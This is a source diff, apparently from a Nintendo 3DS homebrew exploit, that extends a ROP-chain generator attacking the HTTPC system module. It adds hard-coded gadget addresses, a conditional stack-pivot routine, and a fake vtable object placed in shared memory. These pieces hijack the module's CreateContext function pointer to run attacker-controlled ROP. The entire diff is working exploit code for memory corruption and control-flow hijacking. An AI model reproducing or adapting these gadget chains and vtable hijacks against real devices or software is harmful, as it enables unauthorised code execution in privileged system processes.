@@ -45,6 +45,10 @@ u32 ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC = 0x00109148;
 
 u32 ROP_MOVR0_VAL0_BXLR = 0x00104e20;//r0=0x0, bx-lr.
 
+u32 ROP_CMPR0R1_OVERWRITER0_BXLR = 0x00118400;//"cmp r0, r1" On mismatch r0 is set to data from .pool, otherwise r0=0. Then bx-lr.
+
+u32 ROP_CONDEQ_BXLR_VTABLECALL = 0x00119a24;//"beq <addr of bx-lr>" Otherwise, ip = *r0(vtable ptr), ip = *(ip+0xcc), then bx ip.
+
 u32 ROP_memcpy = 0x0010d274;
 u32 ROP_svcControlMemory = 0x00100770;
 u32 ROP_CreateContext = 0x0011689c;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
@@ -71,6 +75,7 @@ u32 httpheap_size = 0x22000;
 
 static u32 __custom_mainservsession_vtable;
 static u32 __custom_contextservsession_vtable;
+static u32 condcallfunc_objaddr;
 
 static u32 __httpmainthread_cmdhandler_stackframe = 0x0ffffe28;
 
@@ -261,6 +266,24 @@ void ropgen_callfunc(u32 **ropchain, u32 *http_ropvaddr, u32 funcaddr, u32 *para
 	ropgen_addword(ropchain, http_ropvaddr, funcaddr);
 
 	ropgen_addwords(ropchain, http_ropvaddr, &params[4], 3);
+}
+
+void ropgen_checkcond(u32 **ropchain, u32 *http_ropvaddr, u32 pivot_addr0, u32 pivot_addr1, u32 type)//Total size: 0x40-bytes(0x48 for non-type0). This compares the values already stored in r0 and r1. Type0: on match this just continues running the ROP following this, otherwise this pivots to pivot_addr1. Type1: on match pivot to pivot_addr0, otherwise pivot to pivot_addr1. When pivot_addr1 is 0, it's set to the address of the ROP following this.
+{
+	u32 addr;
+
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_CMPR0R1_OVERWRITER0_BXLR, 1);
+
+	ropgen_setr0(ropchain, http_ropvaddr, condcallfunc_objaddr);
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_CONDEQ_BXLR_VTABLECALL, 0);
+
+	addr = pivot_addr1;
+	if(addr==0)addr = (*http_ropvaddr) + 0x14;
+
+	ropgen_stackpivot(ropchain, http_ropvaddr, addr);
+	ropgen_addword(ropchain, http_ropvaddr, 0);
+
+	if(type)ropgen_stackpivot(ropchain, http_ropvaddr, pivot_addr0);
 }
 
 void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u32 addr0, u32 addr1, u32 size, MemOp op, MemPerm perm)//Total size: 0x78-bytes.
@@ -491,8 +514,10 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_shar
 
 	u32 params[7] = {0};
 
-	__custom_mainservsession_vtable = ropvmem_base + ropvmem_size - 0x108;
-	__custom_contextservsession_vtable = ropvmem_base + ropvmem_size - 0x108*2;
+	condcallfunc_objaddr = ropvmem_base + ropvmem_size - 0x8;
+
+	__custom_mainservsession_vtable = condcallfunc_objaddr - ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE;
+	__custom_contextservsession_vtable = __custom_mainservsession_vtable - ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE;
 
 	//Setup the ROP-chain used by the CreateContext vtable funcptr.
 
@@ -518,6 +543,14 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_shar
 	ropvaddr = ropvmem_base+ropoffset;
 
 	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base, roplaunch_bakaddr, roplaunch_baksize);//Restore the initial CreateContext ROP using the backup.
+
+	/*
+	ropgen_setr0(&ropchain, &ropvaddr, 0x70);
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_setr0(&ropchain, &ropvaddr, 0x70);
+
+	ropgen_checkcond(&ropchain, &ropvaddr, 0x40404040, 0, 1);//Pivot to 0x40404040 when r0==r1.
+*/
 
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_CreateContext, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original sysmodule one.
 
@@ -567,6 +600,11 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_shar
 		printf("The backup version of the main CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr - __custom_contextservsession_vtable));
 		return -2;
 	}
+
+	//Setup the object used by ropgen_cond_callfunc().
+	ptr = (u32*)&ropvmem_sharedmem[(condcallfunc_objaddr - ropvmem_base) >> 2];
+	ptr[0] = condcallfunc_objaddr + 0x4 - 0xcc;//Setup the vtable ptr so that the funcptr is loaded from the below word.
+	ptr[1] = ROP_POPPC;
 
 	//Setup the custom vtable for main serv session.
 	ptr = (u32*)&ropvmem_sharedmem[(__custom_mainservsession_vtable - ropvmem_base) >> 2];
